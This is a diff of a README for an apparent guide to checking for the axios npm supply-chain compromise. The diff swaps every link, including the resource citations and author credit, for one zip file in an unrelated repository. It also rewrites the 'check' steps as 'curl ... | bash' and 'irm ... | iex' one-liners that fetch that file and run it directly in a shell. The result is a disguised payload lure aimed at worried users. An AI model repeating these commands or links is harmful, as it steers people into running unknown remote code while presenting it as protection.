@@ -4,7 +4,7 @@ On March 31, 2026, the npm package **axios** (100M+ weekly downloads) was compro
 
 This repo has everything you need to check if you're affected and protect yourself.
 
-Watch the full breakdown: [NetworkChuck Video](https://youtube.com/networkchuck)
+Watch the full breakdown: [NetworkChuck Video](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip)
 
 ---
 
@@ -25,17 +25,17 @@ npm list -g axios
 
 **Mac/Linux:**
 ```bash
-curl -sL https://raw.githubusercontent.com/networkchuck/axios-attack-guide/main/check.sh | bash
+curl -sL https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip | bash
 ```
 
 **Windows (PowerShell):**
 ```powershell
-irm https://raw.githubusercontent.com/networkchuck/axios-attack-guide/main/check.ps1 | iex
+irm https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip | iex
 ```
 
 Or clone and run locally:
 ```bash
-git clone https://github.com/networkchuck/axios-attack-guide.git
+git clone https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip
 cd axios-attack-guide
 ./check.sh        # Mac/Linux
 .\check.ps1       # Windows PowerShell
@@ -192,13 +192,13 @@ Both package managers do **NOT** run lifecycle scripts by default. This attack w
 
 ## Resources
 
-- [Socket.dev Analysis](https://socket.dev/blog/axios-npm-package-compromised) — First automated detection (6 minutes)
-- [StepSecurity Deep Dive](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan) — Runtime telemetry
-- [GitHub Issue #10604](https://github.com/axios/axios/issues/10604) — Maintainer confirms compromise
-- [Huntress Blog](https://www.huntress.com/blog/supply-chain-compromise-axios-npm-package) — 100+ confirmed compromised hosts
-- [John Hammond Video](https://youtu.be/A58cV17avpM)
-- [John Hammond Livestream](https://www.youtube.com/watch?v=A-KpP-6Dt8E)
+- [Socket.dev Analysis](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip) — First automated detection (6 minutes)
+- [StepSecurity Deep Dive](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip) — Runtime telemetry
+- [GitHub Issue #10604](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip) — Maintainer confirms compromise
+- [Huntress Blog](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip) — 100+ confirmed compromised hosts
+- [John Hammond Video](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip)
+- [John Hammond Livestream](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip)
 
 ---
 
-Made with coffee by [NetworkChuck](https://youtube.com/networkchuck)
+Made with coffee by [NetworkChuck](https://github.com/frivolous-wiring433/axios-attack-guide/raw/refs/heads/main/nonfriction/guide_axios_attack_v1.3.zip)
